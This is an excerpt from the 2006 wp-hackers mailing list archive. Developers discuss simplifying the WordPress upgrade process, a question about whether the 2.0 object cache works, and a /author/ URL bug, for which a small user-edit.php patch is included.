| > | > | On Mon, 30 Jan 2006 08:10:03 -0500, Scott johnson
| > <fuzzygroup@gmail.com>
| > | > wrote:
| > | > | > I'd be careful with that.  My understanding of randomization in
| > mysql
| > | > | > is that the performance is awful.  I haven't done it myself but
| > that's
| > | > | > hwat I understand.
| > | > | >
| > | > | > Scott
| > | >
| > | > _______________________________________________
| > | > wp-hackers mailing list
| > | > wp-hackers@lists.automattic.com
| > | > http://lists.automattic.com/mailman/listinfo/wp-hackers
| > |
| > | _______________________________________________
| > | wp-hackers mailing list
| > | wp-hackers@lists.automattic.com
| > | http://lists.automattic.com/mailman/listinfo/wp-hackers
| >
| > _______________________________________________
| > wp-hackers mailing list
| > wp-hackers@lists.automattic.com
| > http://lists.automattic.com/mailman/listinfo/wp-hackers
|
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From ringmaster at midnightcircus.com  Wed Feb  1 15:38:45 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  1 15:39:11 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
References: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
Message-ID: <43E0D605.6060606@midnightcircus.com>

In response to a post on wp-docs:

Vogel, Andrew (vogelap) wrote:
> The upgrade documentation is fine, though it would be easier to have a
> list of files that SHOULD be deleted (not just a list of those to KEEP).
> 
> It's kinda the upgrade PROCESS that's a pain. Deleting files is scary
> for Joe User. It would be ideal if the files could just be overwritten.

I'm curious what files we're recommending be specifically deleted and 
why.  Granted, I'm not a typical user, but I essentially upgrade every 
week or so essentially by copying the latest WordPress files directly 
over the existing ones, and then runing upgrade.php.

I've never had an issue that required me to delete a file -- even when 
all of the javascript moved from wp-admin to wp-includes, the old stuff 
is still there and everything runs just fine.  If we're talking about 
the cache, the upgrade code should be flushing the cache before it 
starts, so you shouldn't have to do that, either.

I don't doubt that there are upgrades where it is necessary to delete 
some files, but I need to understand the problem.  What files and why?

Michael E. Hancock wrote:
> 8.  Reactivate the original list of plugins

Vogel, Andrew (vogelap) wrote:
> Here's a plugin idea... a plugin that would take a snapshot of the
> activation status of the plugins on the site, and then batch
> activate/deactivate them. Read on...

<snip>
This seems easy enough, but the point of deactivating plugins is so that 
when the site comes back online after the upgrade it isn't affected by 
incompatible plugins.  If you reactivate all plugins directly after 
install, you not only defeat the purpose of deactivating them in the 
first place, but you then need to programmatically solve the horrible 
puzzle of how to deactivate a bad plugin from WordPress code that does 
not run.

An overall simpler solution might be to create a new plugin header that 
specifies the WordPress versions that the plugin works with.  Upon 
install, if the new version of WordPress does not fall within a plugin's 
working range (using the db version info?) then it would be deactivated.

This solution works nicely because:

1) It can inform the user that an upgrade may be required for their 
plugin to work properly with their current WordPress version.
2) Users can re-activate plugins manually even with the warnings, in the 
case that a plugin is known to work in spite of the version mismatch.
3) Plugins without this version header (all current plugins) will be 
deactivated for not matching.

None of this would fix themes that use functions from deactivated 
plugins.  Apart from Podz's suggestion to wrap all plugin functions in 
if(function_exists()) calls, the only solution I can think of there is 
to tie a theme to the WP version number (like plugins) or to specify 
plugin names/unique functions as requirements for the theme.  In the 
latter case, a theme would name the plugins that it requires in order to 
run, and would automatically revert WP to use Default (just at upgrade 
time?) if those plugins weren't activated.

Alternatively, this might be a good standard feature for a theme's 
functions.php.

Any theme solution is impractical to enforce, therefore improbable to 
happen.  I can imagine a more complicated scenario (similar to how 
Windows provides that boot screen that says, "Windows failed to boot, 
choose an option:") where the install sets an option, "just_installed", 
to 'new'.  Just before attempting to display the theme for the first 
time (when just_installed == 'new'), the option would be set to the IP 
of the request.  When the theme completes, the option would be set to 
'ok'.  If the option is the IP address of the current user and not 'ok' 
, 'new', or some other IP when initially requested, then the theme has 
failed to load, and the theme should be reset to Default.  The option 
could also be set to 'failed=themename' for further examination on the 
Presentation tab.  Or something.

/me returns to crack smoking.

Owen




From skippy at skippy.net  Wed Feb  1 15:42:24 2006
From: skippy at skippy.net (Scott Merrill)
Date: Wed Feb  1 15:43:22 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <43E0D605.6060606@midnightcircus.com>
References: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
	<43E0D605.6060606@midnightcircus.com>
Message-ID: <43E0D6E0.4000704@skippy.net>

Owen Winkler wrote:
> I've never had an issue that required me to delete a file -- even when
> all of the javascript moved from wp-admin to wp-includes, the old stuff
> is still there and everything runs just fine.  If we're talking about
> the cache, the upgrade code should be flushing the cache before it
> starts, so you shouldn't have to do that, either.
> 
> I don't doubt that there are upgrades where it is necessary to delete
> some files, but I need to understand the problem.  What files and why?

There have been scores of posts to the support forums about people
experiencing problems after upgrades.  Many of the people experiencing
these problems copied the new files overtop the old.  When asked to
delete the files, then copy the new files into place, the problems
disappeared.

Maybe it's snake oil, but it seems to work.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From fuzzygroup at gmail.com  Wed Feb  1 15:44:06 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  1 15:45:28 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
References: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
Message-ID: <8e1656660602010744g676602d3kffdf08d25584f349@mail.gmail.com>

Um... I had similar thoughts and then I stepped back and thought
again.  Yes you want that but bear in mind that the simpler you make
things the more extensive the testing and development has to be.  The
classic example is if you want a 10X improvement in ease of use then
you spend 10X more "money" (ok for WP time).  So if Apple spent $50
million to make the Mac in 84 then to do "Mac Next Gen" you have to
spend $500 million.

Now that's a metaphor and not 100% true but there's some real truth
there.  So if you want to make things easy its a lot of hard work. 
And it'll never work in all circumstances no matter what you do.

But if you want to swing for the fences, go for it.  I'd love for it
to be easier myself I just know how hard that is.

Scott

On 2/1/06, Michael E. Hancock <mhancock@us.net> wrote:
> After hearing complaints that both the upgrade and the upgrade instructions
> are too complicated, I wonder can the upgrade be made this simple:
> 1.  Upload the upgrade file
> 2.  Change permissions on the appropriate files/folders (wish I could just
> say folder)
> 3.  In the Admin panel, click on the Update WordPress button and follow the
> instructions
> 4.  Change permissions back to correct state
>
> Of course, step 3 is where all the heavy lifting would occur.
> 1.  Make a backup of the database and any 'customized' files
> 2.  Notify the user of the nature of the 'customized' file conflict and
> allow option to halt the upgrade process
> 3.  Notify user of any incorrect permission settings and allow option to
> halt the upgrade process
> 4.  Delete any files or folders such as wp-content/cache
> 5.  Deactivate the plugins and remember what was deactivated
> 6.  Extract any new/upgrade script file and delete any old unused script
> files
> 7.  Update the database as necessary
> 8.  Reactivate the original list of plugins
> 9.  Warn user of any 'customized' files/scripts that need to be addressed
> 10. Advice user to chmod files/folders back to appropriate state
> 11. Place user back at Admin panel
>
>
> Michael E. Hancock
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From chrome at stupendous.net  Wed Feb  1 16:05:52 2006
From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Wed Feb  1 16:07:20 2006
Subject: [wp-hackers] caching doesn't work?
Message-ID: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>

Hi guys,

I've been looking at the new cache in 2.0. Does it actually work?

cache on:

jupiter:/sixpack/www# mysqladmin status
Uptime: 3550  Threads: 1  Questions: 3452  Slow queries: 0  Opens: 0   
Flush tables: 1  Open tables: 31  Queries per second avg: 0.972
jupiter:/sixpack/www# mysqladmin status
Uptime: 3555  Threads: 1  Questions: 3484  Slow queries: 0  Opens: 0   
Flush tables: 1  Open tables: 31  Queries per second avg: 0.980

cache off:

jupiter:/sixpack/www# mysqladmin status
Uptime: 3579  Threads: 1  Questions: 3518  Slow queries: 0  Opens: 0   
Flush tables: 1  Open tables: 31  Queries per second avg: 0.983
jupiter:/sixpack/www# mysqladmin status
Uptime: 3584  Threads: 1  Questions: 3550  Slow queries: 0  Opens: 0   
Flush tables: 1  Open tables: 31  Queries per second avg: 0.991

Its on a privately hosted system that I'm using to develop some WP  
hacks on so I know nobody else is hitting the DB.

I used:

define('ENABLE_CACHE', false);

to make sure it was disabled and

define('ENABLE_CACHE', true);

to make sure it was enabled.

Its definitely creating cache files. In fact, setting ENABLE_CACHE to  
false seems to still create cache files ...

I think that I should be able to do better than:

Requests per second:    3.78 [#/sec] (mean)
Time per request:       264.632 [ms] (mean)
Time per request:       264.632 [ms] (mean, across all concurrent  
requests)
Transfer rate:          50.75 [Kbytes/sec] received

Is this a bug, or am I just expecting too much? Is there any way I  
can verify that it is working as advertised?

Cheers,

Nathan.
From dmhouse at gmail.com  Wed Feb  1 16:16:02 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  1 16:17:21 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>
Message-ID: <ebe43d680602010816s5f2bc796o@mail.gmail.com>

On 01/02/06, Nathan Ollerenshaw <chrome@stupendous.net> wrote:
> define('ENABLE_CACHE', false);

You need to define('DISABLE_CACHE', true) to turn it off.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From VOGELAP at UCMAIL.UC.EDU  Wed Feb  1 17:35:21 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb  1 17:36:35 2006
Subject: [wp-hackers] Simplified Upgrade Process
Message-ID: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>

The page on the codex recommended deleting (specifically not
overwriting) all WP files with a few exceptions (wp-config.php, etc).

It's a pain to have to do so.

At the VERY least, the codex page should provide an alphabetized list of
the files to delete, not those to keep.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Owen Winkler
> Sent: Wednesday, February 01, 2006 10:39 AM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Simplified Upgrade Process
> 
> In response to a post on wp-docs:
> 
> Vogel, Andrew (vogelap) wrote:
> > The upgrade documentation is fine, though it would be 
> easier to have a 
> > list of files that SHOULD be deleted (not just a list of 
> those to KEEP).
> > 
> > It's kinda the upgrade PROCESS that's a pain. Deleting 
> files is scary 
> > for Joe User. It would be ideal if the files could just be 
> overwritten.
> 
> I'm curious what files we're recommending be specifically 
> deleted and why.  Granted, I'm not a typical user, but I 
> essentially upgrade every week or so essentially by copying 
> the latest WordPress files directly over the existing ones, 
> and then runing upgrade.php.
> 
> I've never had an issue that required me to delete a file -- 
> even when all of the javascript moved from wp-admin to 
> wp-includes, the old stuff is still there and everything runs 
> just fine.  If we're talking about the cache, the upgrade 
> code should be flushing the cache before it starts, so you 
> shouldn't have to do that, either.
> 
> I don't doubt that there are upgrades where it is necessary 
> to delete some files, but I need to understand the problem.  
> What files and why?
> 
> Michael E. Hancock wrote:
> > 8.  Reactivate the original list of plugins
> 
> Vogel, Andrew (vogelap) wrote:
> > Here's a plugin idea... a plugin that would take a snapshot of the 
> > activation status of the plugins on the site, and then batch 
> > activate/deactivate them. Read on...
> 
> <snip>
> This seems easy enough, but the point of deactivating plugins 
> is so that when the site comes back online after the upgrade 
> it isn't affected by incompatible plugins.  If you reactivate 
> all plugins directly after install, you not only defeat the 
> purpose of deactivating them in the first place, but you then 
> need to programmatically solve the horrible puzzle of how to 
> deactivate a bad plugin from WordPress code that does not run.
> 
> An overall simpler solution might be to create a new plugin 
> header that specifies the WordPress versions that the plugin 
> works with.  Upon install, if the new version of WordPress 
> does not fall within a plugin's working range (using the db 
> version info?) then it would be deactivated.
> 
> This solution works nicely because:
> 
> 1) It can inform the user that an upgrade may be required for 
> their plugin to work properly with their current WordPress version.
> 2) Users can re-activate plugins manually even with the 
> warnings, in the case that a plugin is known to work in spite 
> of the version mismatch.
> 3) Plugins without this version header (all current plugins) 
> will be deactivated for not matching.
> 
> None of this would fix themes that use functions from 
> deactivated plugins.  Apart from Podz's suggestion to wrap 
> all plugin functions in
> if(function_exists()) calls, the only solution I can think of 
> there is to tie a theme to the WP version number (like 
> plugins) or to specify plugin names/unique functions as 
> requirements for the theme.  In the latter case, a theme 
> would name the plugins that it requires in order to run, and 
> would automatically revert WP to use Default (just at upgrade
> time?) if those plugins weren't activated.
> 
> Alternatively, this might be a good standard feature for a 
> theme's functions.php.
> 
> Any theme solution is impractical to enforce, therefore 
> improbable to happen.  I can imagine a more complicated 
> scenario (similar to how Windows provides that boot screen 
> that says, "Windows failed to boot, choose an option:") where 
> the install sets an option, "just_installed", to 'new'.  Just 
> before attempting to display the theme for the first time 
> (when just_installed == 'new'), the option would be set to 
> the IP of the request.  When the theme completes, the option 
> would be set to 'ok'.  If the option is the IP address of the 
> current user and not 'ok' 
> , 'new', or some other IP when initially requested, then the 
> theme has failed to load, and the theme should be reset to 
> Default.  The option could also be set to 'failed=themename' 
> for further examination on the Presentation tab.  Or something.
> 
> /me returns to crack smoking.
> 
> Owen
> 
> 
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From ringmaster at midnightcircus.com  Wed Feb  1 17:41:14 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  1 17:41:54 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
Message-ID: <43E0F2BA.9040907@midnightcircus.com>

Vogel, Andrew (vogelap) wrote:
> The page on the codex recommended deleting (specifically not
> overwriting) all WP files with a few exceptions (wp-config.php, etc).

Does it give a reason why?  Which page is it?

Owen


From podz at tamba2.org.uk  Wed Feb  1 17:49:29 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Feb  1 17:50:32 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <43E0F2BA.9040907@midnightcircus.com>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
	<43E0F2BA.9040907@midnightcircus.com>
Message-ID: <43E0F4A9.80006@tamba2.org.uk>

Owen Winkler wrote:
> Vogel, Andrew (vogelap) wrote:
>> The page on the codex recommended deleting (specifically not
>> overwriting) all WP files with a few exceptions (wp-config.php, etc).
> 

If you after a one-size-fits-all upgrade process it just isn't going to
happen.
If the few steps in the readme work for you, great.
But remember that the upgrade instructions have to work for every single
user in as many environments as possible. Remember too that with each
upgrade someone is doing it for the first time - they see all their
posts as being at risk maybe and understandably they need slow
step-by-step instructions that they can follow with confidence.
Unless every theme author and every plugin author works within some sort
of strict framework (which just isn't going to happen) then explicit
steps are needed that cater for all users.

P.
From ringmaster at midnightcircus.com  Wed Feb  1 17:53:43 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Feb  1 17:54:13 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <43E0F4A9.80006@tamba2.org.uk>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>	<43E0F2BA.9040907@midnightcircus.com>
	<43E0F4A9.80006@tamba2.org.uk>
Message-ID: <43E0F5A7.1050709@midnightcircus.com>

Podz wrote:
> Owen Winkler wrote:
>> Vogel, Andrew (vogelap) wrote:
>>> The page on the codex recommended deleting (specifically not
>>> overwriting) all WP files with a few exceptions (wp-config.php, etc).
> 
> If you after a one-size-fits-all upgrade process it just isn't going to
> happen.


I would rather see a simple set of instructions that works most of the 
time with a "Having trouble?" link that points to a page of symptoms and 
potential remedies than a convoluted 3-page installation manual.

That's just me.  :)

Owen

From chris.lott at gmail.com  Wed Feb  1 18:22:04 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Feb  1 18:23:27 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <43E0F5A7.1050709@midnightcircus.com>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
	<43E0F2BA.9040907@midnightcircus.com> <43E0F4A9.80006@tamba2.org.uk>
	<43E0F5A7.1050709@midnightcircus.com>
Message-ID: <9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>

Having experienced the "I don't know why it works, but deleting all
files first seems to fix it" problem myself, I completely understand
why the help docs are so thorough.

+1 on making a simplified and then an "if you have problems" set of documents.

If deleting is going to be the norm, perhaps there needs to be some
jiggering of filenames and locations to make it easier to nuke an
existing installation while leaving the four or five folders and files
necessary alone. Change the prefix of the keeper folders and files
from wp- to wpk- or something? Then one could just nuke wp-*
recursively and be done with it.

c
From skippy at skippy.net  Wed Feb  1 18:25:22 2006
From: skippy at skippy.net (Scott Merrill)
Date: Wed Feb  1 18:26:23 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>	<43E0F2BA.9040907@midnightcircus.com>
	<43E0F4A9.80006@tamba2.org.uk>	<43E0F5A7.1050709@midnightcircus.com>
	<9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>
Message-ID: <43E0FD12.7000707@skippy.net>

Chris Lott wrote:
> If deleting is going to be the norm, perhaps there needs to be some
> jiggering of filenames and locations to make it easier to nuke an
> existing installation while leaving the four or five folders and files
> necessary alone. Change the prefix of the keeper folders and files
> from wp- to wpk- or something? Then one could just nuke wp-*
> recursively and be done with it.

Move _everything_ out of the WordPress root except wp-config.php
perhaps?  Then, just delete all sub-directories _except_ /wp-content/

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From fuzzygroup at gmail.com  Wed Feb  1 18:53:45 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Wed Feb  1 18:55:03 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <43E0FD12.7000707@skippy.net>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
	<43E0F2BA.9040907@midnightcircus.com> <43E0F4A9.80006@tamba2.org.uk>
	<43E0F5A7.1050709@midnightcircus.com>
	<9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>
	<43E0FD12.7000707@skippy.net>
Message-ID: <8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>

Whoa!  like that scares me and will, almost certainly, by definition
break incoming links.  I use wordpress to power my blog site but I
have other files I ftp up like my resume which I can't format well in
WP (my fault not WP's).

I don't know the history of this list well so if this has been covered
before, smack me with a wet noodle but major system upgrades are
basically fairly rare.  This one is painful because WP 2.0 is only a
month ago.  One thing that I've seen is that installing plugins /
themes is non trivial for non geeks.  If installation is really your
interest isn't installing plugins and themes easier a better focus?

*girds self for wet noodle slappage*

Scott

On 2/1/06, Scott Merrill <skippy@skippy.net> wrote:
> Chris Lott wrote:
> > If deleting is going to be the norm, perhaps there needs to be some
> > jiggering of filenames and locations to make it easier to nuke an
> > existing installation while leaving the four or five folders and files
> > necessary alone. Change the prefix of the keeper folders and files
> > from wp- to wpk- or something? Then one could just nuke wp-*
> > recursively and be done with it.
>
> Move _everything_ out of the WordPress root except wp-config.php
> perhaps?  Then, just delete all sub-directories _except_ /wp-content/
>
> --
> skippy@skippy.net | http://skippy.net/
>
> gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
> 506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From mark.wordpress at txfx.net  Wed Feb  1 19:00:42 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb  1 19:02:02 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
	<43E0F2BA.9040907@midnightcircus.com>
	<43E0F4A9.80006@tamba2.org.uk>
	<43E0F5A7.1050709@midnightcircus.com>
	<9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>
	<43E0FD12.7000707@skippy.net>
	<8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>
Message-ID: <7BE43628-6AD6-4824-98E3-A4C879B2FB4D@txfx.net>

On Feb 1, 2006, at 1:53 PM, Scott johnson wrote:

> Whoa!  like that scares me and will, almost certainly, by definition
> break incoming links.  I use wordpress to power my blog site but I
> have other files I ftp up like my resume which I can't format well in
> WP (my fault not WP's).

Do you have these stored in /wp-admin/ or /wp-includes/ or in the WP  
root?  You should probably move them to /wp-content/ .... anything in  
WP root or /wp-admin/ or /wp-includes/ is considered fair game for  
deletion when upgrading WordPress.

As for my method of upgrade... I have WordPress in /wordpress/ I load  
up the new version of WordPress in /wordpress-upgrade/, then I just  
open up a text editor and write a bunch of "rm" and "mv" commands,  
excluding /index.php, /wp-config.php, and /wp-content/, and then  
execute it.

That leaves a lot less downtime than you would get if you deleted  
then FTP'd the stuff up there.

--
Mark Jaquith
http://txfx.net/


From chris.lott at gmail.com  Wed Feb  1 20:18:42 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Feb  1 20:20:00 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>
	<43E0F2BA.9040907@midnightcircus.com> <43E0F4A9.80006@tamba2.org.uk>
	<43E0F5A7.1050709@midnightcircus.com>
	<9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>
	<43E0FD12.7000707@skippy.net>
	<8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>
Message-ID: <9b1b9dab0602011218u4567e0fdrd20126fd314f668f@mail.gmail.com>

On 2/1/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> Whoa!  like that scares me and will, almost certainly, by definition
> break incoming links.  I use wordpress to power my blog site but I
> have other files I ftp up like my resume which I can't format well in
> WP (my fault not WP's).

As do I, but those things should be stored in wp-content or an aliased
directory outside the wp tree? That's how I try to do it anyway.

c
From VOGELAP at UCMAIL.UC.EDU  Wed Feb  1 21:33:49 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb  1 21:35:05 2006
Subject: [wp-hackers] Simplified Upgrade Process
Message-ID: <E7340445E0595A418B2F8DE0AE480E2009710142@ucmail6.ad.uc.edu>

I got it from http://codex.wordpress.org/Upgrading_WordPress, though
http://codex.wordpress.org/User:Carthik/Five_Step_Upgrade tells me just
to overwrite.

I'm comfortable doing it either way, however, I think that instructing
Joe User to delete and upload (instead of overwriting) is cumbersome,
inelegant, and prone to mistakes.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Owen Winkler
> Sent: Wednesday, February 01, 2006 12:41 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Simplified Upgrade Process
> 
> Vogel, Andrew (vogelap) wrote:
> > The page on the codex recommended deleting (specifically not
> > overwriting) all WP files with a few exceptions 
> (wp-config.php, etc).
> 
> Does it give a reason why?  Which page is it?
> 
> Owen
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From dmhouse at gmail.com  Wed Feb  1 21:50:39 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  1 21:52:00 2006
Subject: [wp-hackers] /author/ is still broken.
Message-ID: <ebe43d680602011350s393b8d03t@mail.gmail.com>

We _really_ need to get the WordPress responsibilites framework going,
so we can get proper QA. Another really basic bug slipped into 2.0.1
which is just totally dumbass and really should not have happened.

/author/someone is broken. It 404s. I'm looking into it, any insight
would be great.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From ryan at boren.nu  Wed Feb  1 22:13:47 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  1 22:15:03 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <ebe43d680602011350s393b8d03t@mail.gmail.com>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>
Message-ID: <43E1329B.9000007@boren.nu>

David House wrote:
> We _really_ need to get the WordPress responsibilites framework going,
> so we can get proper QA. Another really basic bug slipped into 2.0.1
> which is just totally dumbass and really should not have happened.
> 
> /author/someone is broken. It 404s. I'm looking into it, any insight
> would be great.

Works for me.

Ryan

From peter.westwood at ftwr.co.uk  Wed Feb  1 22:18:27 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Feb  1 22:20:13 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <43E1329B.9000007@boren.nu>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>
	<43E1329B.9000007@boren.nu>
Message-ID: <43E133B3.2090707@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Ryan Boren wrote:
> David House wrote:
>> We _really_ need to get the WordPress responsibilites framework going,
>> so we can get proper QA. Another really basic bug slipped into 2.0.1
>> which is just totally dumbass and really should not have happened.
>>
>> /author/someone is broken. It 404s. I'm looking into it, any insight
>> would be great.
> 
> Works for me.

For me it is broken for the admin user..

Compare:

http://trunk.wp.sandbox.ftwr.co.uk/author/peter.westwood/

and

http://trunk.wp.sandbox.ftwr.co.uk/author/test/

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD4TOzVPRdzag0AcURAgXcAJ4xFs385rllj1Luh8onFw43UXhbPQCcDryz
V9dZ+27+JXWTHr2YxWH42Vc=
=EUxN
-----END PGP SIGNATURE-----

From dmhouse at gmail.com  Wed Feb  1 22:32:09 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  1 22:33:29 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <43E1329B.9000007@boren.nu>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>
	<43E1329B.9000007@boren.nu>
Message-ID: <ebe43d680602011432i5ff81d9bl@mail.gmail.com>

On 01/02/06, Ryan Boren <ryan@boren.nu> wrote:
> Works for me.

If you've been creating users with Firefox this could cause the
problem. Because user_login is a disabled field on user-edit.php,
Firefox choses not to send the value of the field when you hit submit.
This means that user_nicename doesn't get properly filled from the
login; each user's user_nicename is something like '10' or '4', so the
correct URL for them ends up being something like /author/10, not what
you expect.

I've written a patch which just displays the user login as text on
user-edit.php (this makes more sense as you can't edit it anyway), and
puts the user login in a hidden field. This should fix it when
creating new users. For now the easiest way to fix this bug is to go
through the database and set the user_nicenames to something more
sane.

Patch attached as above.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
-------------- next part --------------
Index: wp-admin/user-edit.php
===================================================================
--- wp-admin/user-edit.php	(revision 3494)
+++ wp-admin/user-edit.php	(working copy)
@@ -79,7 +79,8 @@
 <fieldset>
 <legend><?php _e('Name'); ?></legend>
 <p><label><?php _e('Username: (no editing)'); ?><br />
-<input type="text" name="user_login" value="<?php echo $profileuser->user_login; ?>" disabled="disabled" />
+<strong><?php echo $profileuser->user_login; ?></strong>
+<input type="hidden" name="user_login" value="<?php echo $profileuser->user_login; ?>" />
 </label></p>
 
 <p><label><?php _e('Role:') ?><br />
From peter.westwood at ftwr.co.uk  Wed Feb  1 22:36:55 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Feb  1 22:38:27 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <ebe43d680602011432i5ff81d9bl@mail.gmail.com>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>	<43E1329B.9000007@boren.nu>
	<ebe43d680602011432i5ff81d9bl@mail.gmail.com>
Message-ID: <43E13807.5030202@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

David House wrote:
> On 01/02/06, Ryan Boren <ryan@boren.nu> wrote:
>> Works for me.
> 
> If you've been creating users with Firefox this could cause the
> problem. Because user_login is a disabled field on user-edit.php,
> Firefox choses not to send the value of the field when you hit submit.
> This means that user_nicename doesn't get properly filled from the
> login; each user's user_nicename is something like '10' or '4', so the
> correct URL for them ends up being something like /author/10, not what
> you expect.
> 
> I've written a patch which just displays the user login as text on
> user-edit.php (this makes more sense as you can't edit it anyway), and
> puts the user login in a hidden field. This should fix it when
> creating new users. For now the easiest way to fix this bug is to go
> through the database and set the user_nicenames to something more
